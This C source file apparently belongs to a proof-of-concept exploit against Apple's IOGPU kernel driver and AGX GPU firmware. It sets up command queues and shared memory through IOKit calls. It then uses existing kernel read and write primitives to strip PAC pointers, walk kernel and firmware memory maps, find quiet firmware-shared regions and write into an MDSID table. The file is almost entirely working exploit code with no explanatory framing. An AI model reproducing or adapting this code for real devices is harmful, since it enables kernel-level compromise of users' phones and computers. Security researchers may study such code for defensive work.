#include "IOGPUDevice.h"
#include "poc.h"
#include "offsets.h"
#include "target.h"

#include <IOKit/IOKitLib.h>
#include <libkextrw.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define CREATE_COMMAND_QUEUE       7U
#define CREATE_SHARED_MEMORY       14U
#define CREATE_NOTIFICATION_QUEUE  16U
#define SET_NOTIFICATION_QUEUE     28U
#define SUBMIT_COMMAND_BUFFERS     29U
#define MAX_TASK_MAPS              512U
#define MARKER_OFFSET              0x200ULL
#define MDSID_OFFSET               0x3000ULL

#define IOMD_MAPPINGS              0x18ULL
#define IOSET_ARRAY                0x18ULL
#define IOARRAY_COUNT              0x14ULL
#define IOARRAY_OBJECTS            0x20ULL
#define IOMAP_ADDRESS              0x28ULL
#define IOMAP_LENGTH               0x30ULL

struct queue_output {
    uint32_t id;
    uint32_t padding;
    uint64_t global_id;
};

struct notification_output {
    uint64_t address;
    uint32_t id;
    uint32_t padding;
};

struct shared_output {
    uint64_t address;
    uint32_t size;
    uint32_t id;
};

struct submit_input {
    uint32_t queue_id;
    uint32_t padding;
    uint64_t unknown;
    uint64_t argument_count;
    uint64_t argument_size;
};

static unsigned gSubmitPair[2] = {0, 1};

static uint64_t descriptor_kernel_mapping(uint64_t descriptor,
                                          size_t size);

static uint64_t strip_pac(uint64_t pointer)
{
    __asm__ volatile("xpacd %0" : "+r"(pointer));
    return pointer;
}

static uint64_t kptr(uint64_t address)
{
    if (address < 0xfffffe0000000000ULL ||
        address >= 0xfffffff000000000ULL || (address & 7) != 0) return 0;
    return strip_pac(kread64(address));
}

static int is_kptr(uint64_t pointer)
{
    return pointer >= 0xfffffe0000000000ULL &&
        pointer < 0xfffffff000000000ULL && (pointer & 7) == 0;
}

static int submit(uint32_t first_id, uint32_t second_id)
{
    struct submit_input input = {
        .queue_id = gPoc.queue_id,
        .argument_count = 1,
        .argument_size = gPoc.command_argument_size,
    };
    uint8_t *argument = calloc(1, gPoc.command_argument_size);
    if (!argument) return -1;
    memcpy(argument, &first_id, sizeof(first_id));
    memcpy(argument + sizeof(first_id), &second_id, sizeof(second_id));

    uint64_t output = 0;
    uint32_t output_count = 1;
    kern_return_t kr = IOConnectCallMethod(
        gPoc.connection, SUBMIT_COMMAND_BUFFERS,
        (const uint64_t *)&input, sizeof(input) / sizeof(uint64_t),
        argument, gPoc.command_argument_size,
        &output, &output_count, NULL, NULL);
    free(argument);
    return kr == KERN_SUCCESS ? 0 : -1;
}

int IOGPU_submit_command_buffers(void)
{
    return submit(gPoc.command_buffer_ids[gSubmitPair[0]],
                  gPoc.command_buffer_ids[gSubmitPair[1]]);
}

int IOGPU_set_submit_pair(unsigned first, unsigned second)
{
    if (first >= 2 || second >= 2) return -1;
    gSubmitPair[0] = first;
    gSubmitPair[1] = second;
    return 0;
}

int IOGPU_wait_device_control_idle(unsigned stable_milliseconds)
{
    uint64_t firmware = kptr(gPoc.iogpu +
                             gTarget->accelerator_firmware);
    uint64_t ring = firmware + gTarget->firmware_device_ring_base;
    uint64_t index_block = is_kptr(firmware) ?
        kptr(ring + RING_INDEX_BLOCK) : 0;
    unsigned stable = 0;

    if (!is_kptr(firmware) ||
        kptr(firmware) != kslide(gTarget->agx_firmware_vtable) ||
        !is_kptr(index_block) ||
        kptr(ring) != kslide(gTarget->device_control_ring_vtable)) {
        return -1;
    }

    unsigned limit = stable_milliseconds + 100;
    for (unsigned attempt = 0; attempt < limit; attempt++) {
        uint8_t read = 0;
        uint8_t write = 0;
        if (kreadbuf(index_block + RING_READ_INDEX, &read,
                     sizeof(read)) != KERN_SUCCESS ||
            kreadbuf(index_block + RING_WRITE_INDEX, &write,
                     sizeof(write)) != KERN_SUCCESS) {
            return -1;
        }
        stable = read == write ? stable + 1 : 0;
        if (stable >= stable_milliseconds) return 0;
        usleep(1000);
    }
    return -1;
}

int IOGPU_setup_command_buffers(void)
{
    void *queue_input = calloc(1, gPoc.new_queue_argument_size);
    if (!queue_input) return -1;

    struct queue_output queue = {0};
    size_t queue_size = sizeof(queue);
    kern_return_t kr = IOConnectCallStructMethod(
        gPoc.connection, CREATE_COMMAND_QUEUE, queue_input,
        gPoc.new_queue_argument_size, &queue, &queue_size);
    free(queue_input);
    if (kr != KERN_SUCCESS || queue_size != sizeof(queue)) return -1;

    const uint64_t notification_input[2] = {256, 32};
    struct notification_output notification = {0};
    size_t notification_size = sizeof(notification);
    kr = IOConnectCallMethod(
        gPoc.connection, CREATE_NOTIFICATION_QUEUE,
        notification_input, 2, NULL, 0, NULL, NULL,
        &notification, &notification_size);
    if (kr != KERN_SUCCESS ||
        notification_size != sizeof(notification)) return -1;

    const uint64_t set_input[2] = {queue.id, notification.id};
    if (IOConnectCallScalarMethod(gPoc.connection, SET_NOTIFICATION_QUEUE,
                                  set_input, 2, NULL, NULL) !=
        KERN_SUCCESS) return -1;

    const uint64_t shared_input[2] = {PAGE_SIZE_16K, 0};
    struct shared_output shared[2] = {0};
    for (unsigned i = 0; i < 2; i++) {
        size_t size = sizeof(shared[i]);
        if (IOConnectCallMethod(gPoc.connection, CREATE_SHARED_MEMORY,
                                shared_input, 2, NULL, 0, NULL, NULL,
                                &shared[i], &size) != KERN_SUCCESS ||
            size != sizeof(shared[i]) || shared[i].address == 0) {
            return -1;
        }
        gPoc.command_buffer_addresses[i] =
            (void *)(uintptr_t)shared[i].address;
        gPoc.command_buffer_ids[i] = shared[i].id;
    }

    uint32_t *first = (uint32_t *)(uintptr_t)shared[0].address;
    uint32_t *second = (uint32_t *)(uintptr_t)shared[1].address;
    memset(first, 0, 0x40);
    memset(second, 0, 0x40);
    first[0] = 0x10002;
    first[1] = 0x10;
    second[2] = 1;
    second[3] = 0x40000001;
    second[5] = 0x10;
    atomic_thread_fence(memory_order_seq_cst);

    gPoc.queue_id = queue.id;
    if (submit(shared[0].id, shared[0].id) != 0 ||
        IOGPU_submit_command_buffers() != 0) {
        return -1;
    }
    return 0;
}

static size_t collect_task_maps(uint64_t task,
                                uint64_t maps[MAX_TASK_MAPS])
{
    uint64_t map = is_kptr(task) ?
        kptr(task + IOGPU_TASK_MAP_LIST) : 0;
    size_t count = 0;

    while (is_kptr(map) && count < MAX_TASK_MAPS) {
        for (size_t i = 0; i < count; i++) {
            if (maps[i] == map) return count;
        }
        maps[count++] = map;
        map = kptr(map + MAP_NEXT);
    }

    return count;
}

int IOGPU_resolve_firmware_cpu_alias(uint64_t gpu_address,
                                     uint64_t *cpu_address)
{
    uint64_t maps[MAX_TASK_MAPS] = {0};
    size_t count = collect_task_maps(gPoc.firmware_task, maps);
    uint64_t resolved = 0;
    unsigned matches = 0;

    if (!cpu_address || count == MAX_TASK_MAPS) return -1;
    for (size_t i = 0; i < count; i++) {
        uint64_t map = maps[i];
        uint64_t gpu = kread64(map + MAP_GPU_BASE);
        uint64_t memory = kptr(map + 0x18);
        uint64_t descriptor = is_kptr(memory) ?
            kptr(memory + SYSMEM_IOMD) : 0;
        uint64_t length = is_kptr(descriptor) ?
            kread64(descriptor + IOMD_LENGTH) : 0;
        uint64_t cpu = descriptor_kernel_mapping(descriptor,
                                                  (size_t)length);
        if (!is_kptr(cpu) || length == 0 || gpu_address < gpu ||
            gpu_address - gpu >= length) {
            continue;
        }
        resolved = cpu + gpu_address - gpu;
        matches++;
    }
    if (matches != 1 || !is_kptr(resolved)) return -1;
    *cpu_address = resolved;
    return 0;
}

static uint64_t descriptor_kernel_mapping(uint64_t descriptor,
                                          size_t size)
{
    uint64_t set = is_kptr(descriptor) ?
        kptr(descriptor + IOMD_MAPPINGS) : 0;
    uint64_t array = is_kptr(set) ? kptr(set + IOSET_ARRAY) : 0;
    uint32_t count = is_kptr(array) ?
        kread32(array + IOARRAY_COUNT) : 0;
    uint64_t objects = is_kptr(array) ?
        kptr(array + IOARRAY_OBJECTS) : 0;
    if (!is_kptr(objects) || count == 0 || count > 64) return 0;

    for (uint32_t i = 0; i < count; i++) {
        uint64_t mapping = kptr(objects +
            (uint64_t)i * sizeof(uint64_t));
        uint64_t cpu = is_kptr(mapping) ?
            kread64(mapping + IOMAP_ADDRESS) : 0;
        uint64_t cpu_length = is_kptr(mapping) ?
            kread64(mapping + IOMAP_LENGTH) : 0;
        if (is_kptr(cpu) && cpu_length >= size) return cpu;
    }
    return 0;
}

static int all_zero(const uint8_t *bytes, size_t size)
{
    for (size_t i = 0; i < size; i++) {
        if (bytes[i] != 0) return 0;
    }
    return 1;
}

static int find_quiet_firmware_alias(const uint64_t *maps,
                                     size_t map_count)
{
    uint8_t first[2 * GFX_COPYOUT_STRIDE];
    uint8_t second[sizeof(first)];
    uint64_t best_cpu = 0;
    uint64_t best_gpu = UINT64_MAX;
    uint64_t best_length = 0;

    for (size_t i = 0; i < map_count; i++) {
        uint64_t map = maps[i];
        uint64_t gpu = kread64(map + MAP_GPU_BASE);
        uint64_t memory = kptr(map + 0x18);
        uint64_t descriptor = is_kptr(memory) ?
            kptr(memory + SYSMEM_IOMD) : 0;
        uint64_t length = is_kptr(descriptor) ?
            kread64(descriptor + IOMD_LENGTH) : 0;
        uint64_t cpu = descriptor_kernel_mapping(descriptor,
                                                  (size_t)length);
        if (gpu >= best_gpu || gpu < UINT64_C(0xfffffc0000000000) ||
            length < 0x1000 || length > 0x20000 || !is_kptr(cpu)) {
            continue;
        }

        if (gpu > UINT64_MAX - length) continue;
        uint64_t end = gpu + length;
        for (uint64_t candidate = gpu + 0x800;
             candidate + sizeof(first) <= end; candidate += 0x10) {
            uint64_t delta = candidate - gTarget->gfx_copyout_table;
            if (candidate < gTarget->gfx_copyout_table ||
                delta % GFX_COPYOUT_STRIDE != 0 ||
                delta / GFX_COPYOUT_STRIDE > UINT32_MAX) continue;

            uint64_t alias = cpu + candidate - gpu;
            if (kreadbuf(alias, first, sizeof(first)) != KERN_SUCCESS) {
                continue;
            }
            usleep(10000);
            if (kreadbuf(alias, second, sizeof(second)) != KERN_SUCCESS ||
                memcmp(first, second, sizeof(first)) != 0 ||
                !all_zero(first, sizeof(first))) continue;

            best_cpu = cpu;
            best_gpu = gpu;
            best_length = length;
            break;
        }
    }
    if (best_cpu == 0) return -1;

    gPoc.read_output_address = (void *)(uintptr_t)best_cpu;
    gPoc.read_output_gpu_address = best_gpu;
    gPoc.read_output_size = (size_t)best_length;
    printf("output   cpu=0x%016llx gfx=0x%016llx size=0x%llx\n",
           best_cpu, best_gpu, best_length);
    return 0;
}

int IOGPU_setup_mdsid_table(void)
{
    uint64_t maps[MAX_TASK_MAPS] = {0};
    uint8_t stable[0x20] = {0};
    uint64_t marker_saved = 0;
    uint64_t stable_marker = 0;
    size_t count = collect_task_maps(gPoc.firmware_task, maps);
    if (count == MAX_TASK_MAPS ||
        find_quiet_firmware_alias(maps, count) != 0 ||
        gPoc.read_output_size < MDSID_OFFSET + sizeof(stable)) {
        return -1;
    }

    uint64_t marker_cpu =
        (uint64_t)(uintptr_t)gPoc.read_output_address + MARKER_OFFSET;
    uint64_t marker_gpu = gPoc.read_output_gpu_address + MARKER_OFFSET;
    uint64_t scratch = (uint64_t)(uintptr_t)gPoc.read_output_address +
        MDSID_OFFSET;
    if (!is_kptr(marker_cpu) || !is_kptr(scratch) ||
        kreadbuf(marker_cpu, &marker_saved,
                 sizeof(marker_saved)) != KERN_SUCCESS ||
        kreadbuf(scratch, gPoc.mdsid_table_saved,
                 sizeof(gPoc.mdsid_table_saved)) != KERN_SUCCESS) {
        return -1;
    }
    usleep(10000);
    if (kreadbuf(marker_cpu, &stable_marker,
                 sizeof(stable_marker)) != KERN_SUCCESS ||
        stable_marker != marker_saved ||
        kreadbuf(scratch, stable, sizeof(stable)) != KERN_SUCCESS ||
        memcmp(stable, gPoc.mdsid_table_saved, sizeof(stable)) != 0 ||
        !all_zero(gPoc.mdsid_table_saved,
                  sizeof(gPoc.mdsid_table_saved))) {
        return -1;
    }

    gPoc.marker_cpu_address = marker_cpu;
    gPoc.marker_gpu_address = marker_gpu;
    gPoc.mdsid_table = scratch;
    gPoc.read_output_address = NULL;
    gPoc.read_output_gpu_address = 0;
    gPoc.read_output_size = 0;
    uint16_t entry = 0x100;
    return kwritebuf(scratch, &entry, sizeof(entry)) == KERN_SUCCESS &&
        kread16(scratch) == entry ? 0 : -1;
}

int IOGPU_find_read_output(void)
{
    uint64_t maps[MAX_TASK_MAPS] = {0};
    size_t count = collect_task_maps(gPoc.firmware_task, maps);
    return count != MAX_TASK_MAPS ?
        find_quiet_firmware_alias(maps, count) : -1;
}

int IOGPU_create_shared_page(void **address)
{
    if (!address) return -1;
    const uint64_t input[2] = {PAGE_SIZE_16K, 0};
    struct shared_output shared = {0};
    size_t size = sizeof(shared);
    if (IOConnectCallMethod(gPoc.connection, CREATE_SHARED_MEMORY,
                            input, 2, NULL, 0, NULL, NULL,
                            &shared, &size) != KERN_SUCCESS ||
        size != sizeof(shared) || shared.address == 0 ||
        shared.size < PAGE_SIZE_16K ||
        (shared.address & (PAGE_SIZE_16K - 1)) != 0) {
        return -1;
    }
    *address = (void *)(uintptr_t)shared.address;
    return 0;
}
